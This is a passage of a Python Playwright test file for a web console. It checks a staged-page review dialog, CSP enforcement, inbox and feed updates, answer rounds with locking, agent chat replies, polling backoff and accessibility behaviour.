                self.assertTrue(page.evaluate("document.body.dataset.leaked === undefined"),
                                "the staged page's script reached the console's page")
                self.assertTrue(page.evaluate("document.body.dataset.pageScript === undefined"))
                with page.expect_navigation():
                    page.click("dialog.ck-page-dialog[open] .ck-page-use")   # the dialog's own button publishes
                _wait_for(page, "document.body.dataset.pageScript === 'ran'", timeout=10000)
                self.assertEqual(page.locator("#staged-mark").count(), 1)   # published: served, its script runs
                self.assertEqual(page.locator(".ck-page-proposed-line").count(), 0)
                self.assertEqual(page.locator(".ck-page-waiting, dialog.ck-page-dialog").count(), 0)   # nothing left
                self.assertIn("published by you", page.locator(".ck-page-source").text_content())

    def test_a_refused_publish_names_why_and_publishes_nothing(self):
        # Q29 point 2, the button's other half. Catches: a refusal swallowed (the owner thinks it published), the
        # page reloaded on a refusal, and a stale button publishing a newer staging it never showed.
        from test_server import page_body
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve(publish=False)
                page = self.page(kind, 1280, url)
                newer = page_body(LIVE_HOST.replace("</body>", "<p>NEWER</p></body>"), commit="beef" + "1" * 36)
                self.console.push_page_snapshot(newer)   # staged after the page loaded
                self.open_page_dialog(page)
                page.click("dialog.ck-page-dialog[open] .ck-page-use")
                err = page.wait_for_selector("dialog.ck-page-dialog[open] .ck-page-use-error:not([hidden])")
                self.assertIn("Not published: the staged page is now beef11111111", err.text_content())
                self.assert_not_reloaded(page)
                self.assertFalse((self.cfg.state / "page-snapshot.json").exists())

    # -- the review dialog (owner, 2026-10-02: "can you create a modal rather than place on bottom (button hides
    # under header)"). A staged page is reviewed in a modal <dialog>, opened only by a button the owner presses.

    # A host page like the real lane board: a sticky header at top: 0, z-index 100, over a page that scrolls.
    HEADER_HOST = LIVE_HOST.replace(
        "<body>\n", '<body>\n<header id="host-header" style="position:sticky;top:0;z-index:100;height:72px;'
        'background:#ddd">Host header</header>\n', 1).replace("</body>", '<div style="height:3000px"></div></body>')
    CHIP_HIT = """() => { const c = document.querySelector('.ck-page-waiting'), r = c.getBoundingClientRect();
      const x = r.left + r.width / 2, y = r.top + r.height / 2, at = document.elementFromPoint(x, y);
      return { visible: r.width > 0 && r.height > 0 && getComputedStyle(c).visibility === 'visible',
               inView: r.top >= 0 && r.bottom <= innerHeight && r.left >= 0 && r.right <= innerWidth,
               hit: c.contains(at), at: at ? at.tagName + '#' + at.id + '.' + at.className : null,
               tag: c.tagName, scrolled: scrollY }; }"""
    IN_DIALOG = ("(() => { const d = document.querySelector('dialog.ck-page-dialog');"
                 " return !!d && d.contains(document.activeElement); })()")

    def open_page_dialog(self, page):
        page.click(".ck-page-waiting")
        page.wait_for_selector("dialog.ck-page-dialog[open]")

    def staged_page(self, kind, width, host=LIVE_HOST):
        """`host` published and served, and a newer page staged over it, waiting for the owner."""
        from test_server import page_body
        url = self.serve(page=host)
        self.console.push_page_snapshot(page_body(host.replace("</body>", "<p>NEWER</p></body>"),
                                                  commit="beef" + "2" * 36))
        self.published = (self.cfg.state / "page-snapshot.json").read_bytes()
        return self.page(kind, width, url)

    def test_a_staged_page_shows_a_waiting_button_no_header_covers_and_it_opens_a_modal(self):
        # Catches: the proposal left where a sticky header or the page's length hides it (the owner's report), an
        # indicator that is not a button, one covered at either width or scroll position, and a "dialog" that is
        # not modal (no focus trap, no Esc, no backdrop) or that leaves focus outside it.
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    page = self.staged_page(kind, width, self.HEADER_HOST)
                    for top in (0, 1500, 99999):
                        page.evaluate(f"window.scrollTo({{top: {top}, behavior: 'instant'}})")
                        page.wait_for_timeout(100)
                        got = page.evaluate(self.CHIP_HIT)
                        self.assertEqual(got["tag"], "BUTTON", got)
                        self.assertTrue(got["visible"] and got["inView"] and got["hit"], got)
                    self.assertGreater(got["scrolled"], 1000)   # the page really scrolled
                    chip = page.locator(".ck-page-waiting")
                    self.assertIn("New dashboard page waiting", chip.text_content())
                    self.assertEqual(chip.get_attribute("aria-haspopup"), "dialog")
                    self.open_page_dialog(page)
                    self.assertEqual(page.locator("dialog[open]").count(), 1)
                    self.assertTrue(page.evaluate("document.querySelector('dialog.ck-page-dialog').matches(':modal')"))
                    self.assertTrue(page.evaluate(self.IN_DIALOG))
                    dlg = page.locator("dialog.ck-page-dialog")
                    name_id = dlg.get_attribute("aria-labelledby")
                    self.assertEqual(page.locator(f"#{name_id}").text_content(), "New dashboard page")
                    self.assertIn("Proposed dashboard:", dlg.locator(".ck-page-proposed-line").text_content())
                    for b in (".ck-page-use", ".ck-page-not-now"):
                        self.assertTrue(dlg.locator(b).is_visible(), b)
                    self.assertEqual(dlg.locator("iframe").get_attribute("sandbox"), "")
                    self.assertFalse(page.evaluate(OVERFLOW))
                    self.assert_not_reloaded(page)

    def test_esc_and_not_now_close_the_dialog_publish_nothing_and_return_focus(self):
        # Catches: closing the dialog publishing (or reloading), focus dropped on <body> after close, and an Esc
        # that also closes the inbox behind it.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self.staged_page(kind, 1280)
                for close in ("Escape", "Not now"):
                    self.open_page_dialog(page)
                    if close == "Escape":
                        page.keyboard.press("Escape")
                    else:
                        page.click("dialog.ck-page-dialog[open] .ck-page-not-now")
                    _wait_for(page, "!document.querySelector('dialog.ck-page-dialog').open")
                    self.assertTrue(page.evaluate("document.activeElement.classList.contains('ck-page-waiting')"),
                                    close)
                    self.assertEqual((self.cfg.state / "page-snapshot.json").read_bytes(), self.published,
                                     close)   # nothing published
                    self.assertTrue((self.cfg.state / "page-staged.json").exists(), close)      # still offered
                    self.assert_not_reloaded(page)
                self.open_inbox(page, 1280)
                self.open_page_dialog(page)
                page.keyboard.press("Escape")
                _wait_for(page, "!document.querySelector('dialog.ck-page-dialog').open")
                self.assertEqual(page.locator(".ck-panel").get_attribute("data-open"), "true")   # inbox untouched

    def test_the_review_dialog_never_opens_on_load(self):
        # Catches: a modal that steals focus the moment the page loads.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self.staged_page(kind, 1280)
                page.wait_for_timeout(500)
                self.assertEqual(page.locator("dialog.ck-page-dialog").count(), 1)
                self.assertEqual(page.locator("dialog[open]").count(), 0)
                self.assertFalse(page.evaluate(self.IN_DIALOG))
                self.assertFalse(page.locator(".ck-page-proposed-line").is_visible())   # held until asked for
                self.assertTrue(page.locator(".ck-page-waiting").is_visible())

    def test_without_the_console_script_the_proposal_is_still_shown(self):
        # Catches: a proposal reachable only through JavaScript (a closed <dialog> is display: none).
        browser = getattr(self.pw, BROWSERS[0]).launch()
        self.addCleanup(browser.close)
        url = self.serve(publish=False)
        ctx = browser.new_context(viewport={"width": 1280, "height": 900}, java_script_enabled=False)
        page = ctx.new_page()
        page.route("**/*", lambda route: route.continue_(
            headers={**route.request.headers, "cf-access-jwt-assertion": self.tok}))
        page.goto(url)
        self.assertTrue(page.locator(".ck-page-proposed-line").is_visible())
        self.assertTrue(page.locator(".ck-page-use").is_visible())
        self.assertTrue(page.locator(".ck-page-preview iframe").is_visible())
        self.assertEqual(page.locator("dialog[open]").count(), 0)
        self.assertFalse(page.locator(".ck-page-waiting").is_visible())   # it would do nothing without the script
        self.assertFalse(page.locator(".ck-page-not-now").is_visible())

    def test_a_new_question_appears_without_reload_and_the_chip_counts_it(self):
        # Catches: a page that only refreshes on open or on Refresh (the owner sees nothing
        # new until they click); an unread chip that counts the owner's own writes; one that
        # never clears once looked at; and an update done by reloading the page.
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    self.ask(1)
                    page = self.page(kind, width, url)
                    chip = ".ck-dock-strip .ck-new-count" if width >= 1024 else ".ck-inbox-btn .ck-new-count"
                    self.assertEqual(page.locator(chip).text_content(), "")  # a first visit starts at nothing new
                    self.console.write("message", {"item": "LANE.1", "text": "owner note", "nonce": "ownernote01"},
                                       "owner")
                    page.wait_for_timeout(1500)
                    self.assertEqual(page.locator(chip).text_content(), "")  # the owner's own write is not "new"
                    self.ask(2)
                    _wait_for(page, f"document.querySelector('{chip}').textContent === '1 new'", timeout=10000)
                    _wait_for(page, "document.querySelector('.ck-inbox-count').textContent === '2'")
                    label = page.locator(".ck-dock-strip" if width >= 1024 else ".ck-inbox-btn").get_attribute("aria-label")
                    self.assertIn("1 new since you last looked", label)
                    self.open_inbox(page, width)
                    page.wait_for_selector(".ck-inbox-item[data-qid='LANE.1/Q2']")
                    _wait_for(page, f"document.querySelector('{chip}').textContent === ''")
                    # With the inbox open, the next question is drawn in place, and marked as arriving.
                    self.ask(3)
                    page.wait_for_selector(".ck-inbox-item[data-qid='LANE.1/Q3'].ck-arrived", timeout=10000)
                    self.assertFalse(page.evaluate(OVERFLOW))
                    self.assert_not_reloaded(page)

    # Every CSP violation the page raises, recorded before any of its own script runs.
    CSP_WATCH = ("window.__csp = []; document.addEventListener('securitypolicyviolation',"
                 " e => window.__csp.push(e.effectiveDirective + ' ' + e.blockedURI));")
    IMG = "src => new Promise(r => { const i = new Image(); i.onload = () => r('loaded'); i.onerror = () => r('blocked'); i.src = src; })"
    PIXEL = ("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAAS"
             "UVORK5CYII=")

    def test_a_related_ruling_reaches_the_card_from_the_real_server_under_its_csp(self):
        # 1.34.7, the one-off 1.34.4 check made permanent. The DockTests chip test feeds the page a
        # stub's copy of what server.page_payload attaches; this one goes through the real server.
        # Catches: page_payload no longer attaching `related_lessons` (or the page reading another
        # name), so the 📎 chip never shows; a console change that trips its own nonce-only CSP
        # (an inline handler, a style attribute, an eval) where only a console message would say so;
        # and a CSP loosened to let the page load or send to another origin.
        from overture import lessons as LN
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                LN.record(self.cfg.state, "LANE.1/Q0", "LANE.1", "withdraw",
                          "Which retry policy applies to the upload API?",
                          "obsolete: the upload API was replaced by the batch endpoint", "2026-10-01T00:00:00Z")
                self.ask(7, text="Which retry policy applies to the upload API now?")
                page = self.page(kind, 1400, url, init=self.CSP_WATCH)
                self.open_inbox(page, 1400)
                page.click(".ck-inbox-item[data-qid='LANE.1/Q7']")
                line = page.locator(".ck-q-line[data-qid='LANE.1/Q7'][aria-expanded='false']")
                if line.count():                  # a long card opens rolled up to its line
                    line.first.click()
                page.wait_for_selector("summary.ck-q-lessons-chip")
                page.click("summary.ck-q-lessons-chip")
                self.assertIn("replaced by the batch endpoint", page.locator(".ck-q-lesson").first.inner_text())
                self.assertEqual(page.evaluate("window.__csp"), [], "the console tripped its own CSP")
                self.assertEqual(page.evaluate(self.IMG, self.PIXEL), "loaded")
                self.assertEqual(page.evaluate(self.IMG, "https://example.com/x.png"), "blocked")
                self.assertEqual(page.evaluate("() => fetch('https://example.com/').then(() => 'reached', () => 'blocked')"),
                                 "blocked")
                _wait_for(page, "() => window.__csp.some(v => v.startsWith('img-src'))"
                                " && window.__csp.some(v => v.startsWith('connect-src'))")

    def test_the_feed_shows_events_as_they_happen_and_filters_them(self):
        # Catches: a Feed fetched once and never again, one that loses its filter on a live
        # update, and one built from the view (which has no lock records).
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    self.ask(1)
                    page = self.page(kind, width, url)
                    self.open_inbox(page, width)
                    page.click("#ck-tab-feed")
                    page.wait_for_selector(".ck-feed-row[data-kind='question']")
                    self.ask(2)
                    _wait_for(page, 
                        "(() => { const r = document.querySelector('.ck-feed-row');"
                        " return r && r.textContent.includes('LANE.1/Q2') && r.dataset.kind === 'question'; })()",
                        timeout=10000)
                    self.assertEqual(page.locator(".ck-feed-row.ck-feed-new").count(), 1)  # Q2 arrived after opening
                    a = self.console.write("answer", {"qid": "LANE.1/Q1", "picks": ["fix"], "own_text": "",
                                                      "nonce": "feedanswer1"}, "owner")
                    self.console.write("lock", {"qid": "LANE.1/Q1", "answer": a["id"], "nonce": "feedlock001"}, "owner")
                    page.select_option("#ck-feed-kind", "lock")
                    _wait_for(page, "document.querySelectorAll('.ck-feed-row').length === 1"
                                           " && document.querySelector('.ck-feed-row').dataset.kind === 'lock'",
                                           timeout=10000)
                    self.ask(3)  # a live update keeps the filter: still only locks
                    page.wait_for_timeout(1500)
                    self.assertEqual(page.eval_on_selector_all(".ck-feed-row", "rs => rs.map(r => r.dataset.kind)"),
                                     ["lock"])
                    self.assertIn("not listed here", page.locator(".ck-feed-foot").text_content())
                    self.assertFalse(page.evaluate(OVERFLOW))
                    self.assert_not_reloaded(page)

    def test_a_round_is_one_form_drafts_survive_and_lock_all_rings_once(self):
        # Catches: a form that locks as you pick (nothing may lock before the review page);
        # drafts lost on moving between questions, leaving the form or reloading; a review
        # page that shows stale picks after a change; a Lock all that locks the questions
        # left, or rings "process" once per question; and ←/→ or 1-9 keys that do nothing.
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    spec = self.cfg.root / "docs" / "spec.md"
                    spec.parent.mkdir(parents=True)
                    spec.write_text("intro\nThe bundle cap is 64 KiB.\nend\n")
                    f = self.console.write("message", {"item": "LANE.1", "text": "tighten this", "intent": "fork",
                                                       "mode": "tighten", "nonce": "roundfork01"}, "owner")
                    for n in (1, 2, 3):
                        extra = {"evidence": [{"cite": "docs/spec.md:2", "command": "grep -n cap docs/spec.md",
                                               "result": "2:The bundle cap is 64 KiB."}]} if n == 1 else {}
                        self.ask(n, forked_from=f["id"], star_by="panel", **extra)
                    spec.write_text("intro\nThe bundle cap is 32 KiB.\nend\n")  # changed since asked
                    page = self.page(kind, width, url)
                    self.open_inbox(page, width)
                    page.click(".ck-round-card button")
                    page.wait_for_selector(".ck-round-step")
                    # Q1: evidence, read now, says the cited line changed.
                    page.wait_for_selector(".ck-evidence-state[data-state='changed']")
                    self.assertIn("32 KiB", page.locator(".ck-evidence-row .ck-evidence-lines").text_content())
                    if os.environ.get("OVERTURE_SHOTS"):
                        page.locator(".ck-panel").screenshot(
                            path=str(Path(os.environ["OVERTURE_SHOTS"]) / f"round-step-{kind}-{width}.png"))
                    page.keyboard.press("2")  # picks "Record in findings.md"
                    self.assertTrue(page.locator(".ck-round-options input[value='record']").is_checked())
                    page.fill("#ck-round-words", "Record it; the cap moves next quarter.")
                    page.locator(".ck-round-options input[value='record']").focus()
                    page.keyboard.press("ArrowRight")
                    _wait_for(page, "document.querySelector('.ck-round-count').textContent.startsWith('Question 2 of 3')")
                    page.keyboard.press("1")
                    page.keyboard.press("ArrowLeft")  # back: the draft is still there
                    _wait_for(page, "document.querySelector('.ck-round-count').textContent.startsWith('Question 1 of 3')")
                    self.assertTrue(page.locator(".ck-round-options input[value='record']").is_checked())
                    self.assertEqual(page.input_value("#ck-round-words"), "Record it; the cap moves next quarter.")
                    self.assertEqual(self.console.store.head("LANE.1/Q1"), None)  # nothing written by a pick
                    # Leave the form, come back, and reload: the drafts survive all three.
                    page.click(".ck-panel .ck-back-btn" if width < 400 else ".ck-panel .ck-sheet-toggle")
                    page.evaluate("ConsoleKit.openRound(%s)" % json.dumps(f["id"]))
                    page.wait_for_selector(".ck-round-step")
                    self.assertTrue(page.locator(".ck-round-options input[value='record']").is_checked())
                    page.reload()
                    _wait_for(page, "document.querySelector('.ck-inbox-count').textContent !== '✉'")  # 1.24.0: the pre-load glyph
                    page.evaluate("ConsoleKit.openRound(%s)" % json.dumps(f["id"]))
                    page.wait_for_selector(".ck-round-step")
                    self.assertTrue(page.locator(".ck-round-options input[value='record']").is_checked())
                    page.get_by_role("button", name="Review all").click()
                    page.wait_for_selector(".ck-review-heading")
                    rows = page.eval_on_selector_all(".ck-review-row", "rs => rs.map(r => r.dataset.status)")
                    self.assertEqual(rows, ["picked", "picked", "left"])
                    # Going back to change a pick before committing works.
                    page.get_by_role("button", name="Change LANE.1/Q2").click()
                    page.wait_for_selector(".ck-round-step")
                    page.keyboard.press("3")
                    page.get_by_role("button", name="Review all").click()
                    self.assertIn("Leave it", page.locator(".ck-review-row").nth(1).text_content())
                    if os.environ.get("OVERTURE_SHOTS"):
                        page.locator(".ck-panel").screenshot(
                            path=str(Path(os.environ["OVERTURE_SHOTS"]) / f"round-review-{kind}-{width}.png"))
                    self.assertFalse(page.evaluate(OVERFLOW))
                    self.assertEqual([b for b in self.bell() if b.get("intent") == "process"], [])
                    page.click(".ck-lock-all")
                    page.wait_for_selector(".ck-result-heading")
                    st = self.console.store
                    self.assertEqual((st.head("LANE.1/Q1")["picks"], st.head("LANE.1/Q1")["own_text"]),
                                     (["record"], "Record it; the cap moves next quarter."))
                    self.assertEqual(st.head("LANE.1/Q2")["picks"], ["leave"])
                    self.assertIsNotNone(st.lock_of(st.head("LANE.1/Q1")["id"]))
                    self.assertIsNotNone(st.lock_of(st.head("LANE.1/Q2")["id"]))
                    self.assertIsNone(st.head("LANE.1/Q3"))  # left: still unanswered
                    self.assertEqual(len([b for b in self.bell() if b.get("intent") == "process"]), 1)
                    self.assertIsNone(page.evaluate("localStorage.getItem('ck:live-test:round:%s')" % f["id"]))

    def test_a_refused_lock_all_locks_nothing_and_keeps_the_drafts(self):
        # Catches: a form that locks the good half of a refused batch; one that clears the
        # owner's drafts (and comments) on a refusal; one that reports success when the
        # server locked nothing; and a refusal that does not say which question and why.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                f = self.console.write("message", {"item": "LANE.1", "text": "x", "intent": "fork", "mode": "explore",
                                                   "nonce": "refusefork1"}, "owner")
                self.ask(1, forked_from=f["id"], star_by="panel")
                self.ask(2, forked_from=f["id"], star_by="panel")
                # No live updates in this tab, so it still believes Q1 is open when it presses.
                page = self.page(kind, 1280, url, block_live=True)
                page.evaluate("ConsoleKit.openRound(%s)" % json.dumps(f["id"]))
                page.wait_for_selector(".ck-round-step")
                page.keyboard.press("1")
                page.fill("#ck-round-words", "my reason for Q1")
                page.locator(".ck-round-options input[value='fix']").focus()
                page.keyboard.press("ArrowRight")
                _wait_for(page, "document.querySelector('.ck-round-count').textContent.startsWith('Question 2 of 2')")
                page.keyboard.press("2")
                page.get_by_role("button", name="Review all").click()
                # Meanwhile, another tab locks Q1 with a different answer.
                a = self.console.write("answer", {"qid": "LANE.1/Q1", "picks": ["leave"], "own_text": "",
                                                  "nonce": "othertab01"}, "owner")
                self.console.write("lock", {"qid": "LANE.1/Q1", "answer": a["id"], "nonce": "othertab02"}, "owner")
                seq = self.console.store.seq()
                page.click(".ck-lock-all")
                page.wait_for_selector(".ck-review-heading ~ [role='alert']")
                self.assertIn("Nothing was locked", page.locator("[role='alert']").text_content())
                self.assertIn("supersede", page.locator(".ck-review-row").nth(0).text_content())
                self.assertEqual(self.console.store.seq(), seq)  # not Q2 either
                self.assertIsNone(self.console.store.head("LANE.1/Q2"))
                saved = json.loads(page.evaluate("localStorage.getItem('ck:live-test:round:%s')" % f["id"]))
                self.assertEqual(saved["drafts"]["LANE.1/Q1"]["text"], "my reason for Q1")  # kept
                self.assertEqual(saved["drafts"]["LANE.1/Q2"]["picks"], ["record"])
                # Brought up to date, the form shows Q1 as locked, and Lock all locks the rest.
                page.evaluate("ConsoleKit.refresh()")
                _wait_for(page, "document.querySelector('.ck-review-row').dataset.status === 'locked'")
                page.click(".ck-lock-all")
                page.wait_for_selector(".ck-result-heading")
                self.assertEqual(self.console.store.head("LANE.1/Q2")["picks"], ["record"])
                self.assertEqual(self.console.store.head("LANE.1/Q1")["picks"], ["leave"])  # never superseded here
                self.assertEqual(len([b for b in self.bell() if b.get("intent") == "process"]), 1)

    def test_a_chat_message_wakes_the_watch_and_the_reply_appears(self):
        # Catches: a chat that is stored but rings nothing (no session would wake), and an
        # agent reply that only shows after a reload.
        from overture import doorbell as D
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    page = self.page(kind, width, url)
                    self.open_inbox(page, width)
                    self.open_section_tab(page, "team", "chat")
                    page.fill("#ck-chat-input", "Is the project build green?")
                    page.keyboard.press("Enter")
                    page.wait_for_selector(".ck-chat-msg[data-by='owner']")
                    # The ● waits on the Chat tab and, since 1.48 (U1), on Team's rail badge (it rode on "More").
                    _wait_for(page, "(document.querySelector('#ck-tab-chat .ck-tab-note') || {}).textContent === ' ●'"
                                    " && (document.querySelector('.ck-rail-btn[data-section=team] .ck-rail-badge')"
                                    " || {}).textContent === '●'")
                    woke = D.watch(self.cfg.inbox, 0, poll=0.05, timeout=5)
                    self.assertEqual([(w["intent"], w["item"]) for w in woke], [("chat", "@chat")])
                    msg = [r for r in self.console.store.records() if r["type"] == "message"][-1]
                    self.assertEqual((msg["by"], msg["intent"], msg["text"]),
                                     ("owner", "chat", "Is the project build green?"))
                    self.agent_post("/message", {"item": "@chat", "text": "Green at abc123.", "reply_to": msg["id"],
                                                 "nonce": "chatreply01"})
                    page.wait_for_selector(".ck-chat-msg[data-by='agent']", timeout=10000)
                    self.assertIn("Green at abc123.", page.locator(".ck-chat-msg[data-by='agent']").text_content())
                    _wait_for(page, "!document.querySelector('#ck-tab-chat .ck-tab-note')"
                                    " && !document.querySelector('.ck-rail-btn[data-section=team] .ck-rail-badge')")
                    self.assertFalse(page.evaluate(OVERFLOW))
                    if os.environ.get("OVERTURE_SHOTS"):
                        page.locator(".ck-panel").screenshot(
                            path=str(Path(os.environ["OVERTURE_SHOTS"]) / f"chat-{kind}-{width}.png"))
                    self.assert_not_reloaded(page)

    def test_a_named_agent_is_shown_by_name_and_an_unnamed_one_as_before(self):
        # 0.8.2. Catches: a name the view carries but the page never shows (the owner still sees
        # "agent" on every session's reply), and an unnamed record whose author text changed.
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    body = {"qid": "LANE.1/Q1", "item": "LANE.1", "text": "Question 1: which way?", "kind": "single",
                            "options": [{"id": "fix", "label": "Fix now"}, {"id": "leave", "label": "Leave it"}],
                            "star": "fix", "source": "docs/spec.md:1", "valid_if": [], "nonce": "namedq0001"}
                    code, out = self.SV.agent_request(self.cfg.socket, "POST", "/question", body, agent="agent-6")
                    self.assertEqual(code, 200, out)
                    for text, nonce, name in (("Named reply.", "namedreply01", "agent-6"),
                                              ("Plain reply.", "plainreply01", None)):
                        code, out = self.SV.agent_request(self.cfg.socket, "POST", "/message",
                                                          {"item": "LANE.1", "text": text, "nonce": nonce}, agent=name)
                        self.assertEqual(code, 200, out)
                        code, out = self.SV.agent_request(self.cfg.socket, "POST", "/message",
                                                          {"item": "@chat", "text": "Chat " + text, "nonce": "c" + nonce},
                                                          agent=name)
                        self.assertEqual(code, 200, out)
                    page = self.page(kind, width, url)
                    self.open_inbox(page, width)
                    page.click(".ck-inbox-item[data-qid='LANE.1/Q1']")
                    page.wait_for_selector(".ck-q-agent")
                    self.assertEqual(page.locator(".ck-q-agent").first.text_content(), "asked by agent-6")
                    bys = page.locator(".ck-message-by").all_text_contents()
                    self.assertIn("agent-6", bys)
                    self.assertIn("agent", bys)          # the unnamed reply reads as it always did
                    self.assertFalse(page.evaluate(OVERFLOW))
                    page = self.page(kind, width, url)       # a fresh page for the chat tab
                    self.open_inbox(page, width)
                    self.open_section_tab(page, "team", "chat")
                    page.wait_for_selector(".ck-chat-msg[data-by='agent']")
                    who = page.locator(".ck-chat-msg[data-by='agent'] .ck-chat-who").all_text_contents()
                    self.assertTrue(any(w.startswith("agent-6 · ") for w in who), who)
                    self.assertTrue(any(w.startswith("Agent · ") for w in who), who)
                    self.assertFalse(page.evaluate(OVERFLOW))
                    self.assert_not_reloaded(page)

    def test_polling_pauses_when_hidden_and_backs_off_on_errors(self):
        # Catches: a loop that keeps polling in a background tab (a thread held open for
        # nothing), and one that retries a failing server in a tight loop.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                page.wait_for_timeout(500)
                page.evaluate("Object.defineProperty(document, 'visibilityState', {configurable: true, get: () => 'hidden'});"
                              "document.dispatchEvent(new Event('visibilitychange'))")
                page.wait_for_timeout(300)
                n = len(self.waits)
                self.ask(1)  # a change while hidden starts no poll
                page.wait_for_timeout(2500)
                self.assertEqual(len(self.waits), n)
                page.evaluate("Object.defineProperty(document, 'visibilityState', {configurable: true, get: () => 'visible'});"
                              "document.dispatchEvent(new Event('visibilitychange'))")
                _wait_for(page, "document.querySelector('.ck-inbox-count').textContent === '1'", timeout=10000)
                # A server that fails: the loop backs off (2 s, 4 s, ...), never a tight loop.
                page.route("**/api/wait*", lambda r: r.fulfill(status=503, body="{}", content_type="application/json"))
                page.wait_for_timeout(300)
                start = len(self.waits)
                page.wait_for_timeout(5000)
                self.assertLessEqual(len(self.waits) - start, 3)

    def test_motion_is_off_under_reduced_motion(self):
        # Catches: animations that ignore the owner's reduced-motion setting.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url, reduced=True)
                self.ask(1)
                _wait_for(page, "document.querySelector('.ck-dock-strip .ck-new-count').textContent === '1 new'",
                                       timeout=10000)
                names = page.evaluate("""() => [document.querySelector('.ck-dock-strip .ck-new-count'),
                    document.querySelector('.ck-item-btn .ck-ring-arc')].map(e => {
                      const s = getComputedStyle(e); return [s.animationName, s.transitionDuration]; })""")
                self.assertEqual(names, [["none", "0s"], ["none", "0s"]])

    def test_an_item_opened_from_the_inbox_offers_the_way_back(self):
        # Catches (owner, 2026-09-30: "when diving into an inbox item, there is no button to go
        # back to the inbox"): an item header whose Back is hidden on a wide screen; one that
        # leaves for the board instead of the inbox; focus dropped on the way in or out; and a
        # Back-to-inbox on an item the BOARD opened, where it would lead somewhere the owner
        # never was.
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    self.ask(1)
                    page = self.page(kind, width, url)
                    self.open_inbox(page, width)
                    page.click(".ck-inbox-item[data-qid='LANE.1/Q1']")
                    page.wait_for_selector(".ck-title-id")
                    back = page.locator(".ck-panel .ck-back-btn")
                    self.assertTrue(back.is_visible())
                    self.assertEqual(back.get_attribute("aria-label"), "Back to inbox")
                    self.assertEqual(back.text_content(), "← Inbox")
                    self.assertTrue(page.evaluate("document.activeElement.classList.contains('ck-back-btn')"))
                    back.click()
                    page.wait_for_selector(".ck-tabs")
                    self.assertEqual(page.get_attribute(".ck-panel", "data-open"), "true")
                    self.assertEqual(page.evaluate("document.activeElement.getAttribute('data-qid')"), "LANE.1/Q1")
                    # Opened from the board, the same item keeps the board's Back, at every width since 0.9.0
                    # ("the ← Back button no longer hides at desktop widths").
                    page.evaluate("window.ConsoleKit.open('LANE.1')")
                    page.wait_for_selector(".ck-title-id")
                    back = page.locator(".ck-panel .ck-back-btn")
                    self.assertEqual(back.get_attribute("aria-label"), "Back to board")
                    self.assertTrue(back.is_visible())
                    self.assertEqual(back.text_content(), "← Back")
                    self.assertFalse(page.evaluate(OVERFLOW))
                    self.assert_not_reloaded(page)

    def test_one_lock_covers_every_answered_question_on_an_item(self):
        # Catches (owner, 2026-09-30: "there should be a 'lock all items' button rather than one
        # for each question being answered"): no such button; one offered for a single answer;
        # one that locks before its confirmation, locks a question nobody answered, or rings
        # "process" (locking is not asking the agent to act).
        def locks():
            return sorted(b["qid"] for b in self.bell() if b.get("type") == "lock")

        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    for n in (1, 2, 3):
                        self.ask(n)
                    self.console.write("answer", {"qid": "LANE.1/Q1", "picks": ["fix"], "own_text": "",
                                                  "nonce": "lockallans1"}, "owner")
                    page = self.page(kind, width, url)
                    page.evaluate("window.ConsoleKit.open('LANE.1')")
                    page.wait_for_selector(".ck-question")
                    self.assertEqual(page.locator(".ck-lock-answered-open").count(), 0)  # one answer: its own button
                    self.console.write("answer", {"qid": "LANE.1/Q2", "picks": ["record"], "own_text": "",
                                                  "nonce": "lockallans2"}, "owner")
                    page.click(".ck-status-bar .ck-refresh-btn >> nth=0")
                    page.wait_for_selector(".ck-lock-answered-open", timeout=10000)
                    self.assertEqual(page.locator(".ck-lock-answered-open").text_content(), "Lock all 2 answers…")
                    page.click(".ck-lock-answered-open")
                    page.wait_for_selector(".ck-lock-answered .ck-confirm")
                    self.assertEqual(locks(), [])  # nothing locks before the confirmation
                    self.assertEqual(page.locator(".ck-lock-answered-qid").all_text_contents(),
                                     ["LANE.1/Q1", "LANE.1/Q2"])
                    self.assertFalse(page.evaluate(OVERFLOW))
                    page.click(".ck-lock-answered-go")
                    _wait_for(page, 
                        "document.querySelectorAll(\".ck-q-state[data-state='locked']\").length === 2", timeout=10000)
                    self.assertEqual(locks(), ["LANE.1/Q1", "LANE.1/Q2"])  # Q3, unanswered, is not locked
                    self.assertEqual(page.locator(".ck-lock-answered-open").count(), 0)
                    self.assertEqual(page.locator(".ck-lock-answered .ck-error-msg").count(), 0)
                    self.assertEqual([b for b in self.bell() if b.get("intent") == "process"], [])
                    self.assert_not_reloaded(page)

    def test_a_refused_lock_stops_the_run_names_it_and_can_be_dismissed(self):
        # Catches: a run that goes on past a refusal, or stops silently; an error that does not
        # name the question or the count; one that cannot be cleared; focus left on <body>.
        def locks():
            return sorted(b["qid"] for b in self.bell() if b.get("type") == "lock")

        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                for n in (1, 2, 3):
                    self.ask(n)
                for n in (1, 2, 3):
                    self.console.write("answer", {"qid": f"LANE.1/Q{n}", "picks": ["fix"], "own_text": "",
                                                  "nonce": f"refusedans{n}"}, "owner")
                page = self.page(kind, 1280, url, block_live=True)  # the confirm keeps the answers it showed
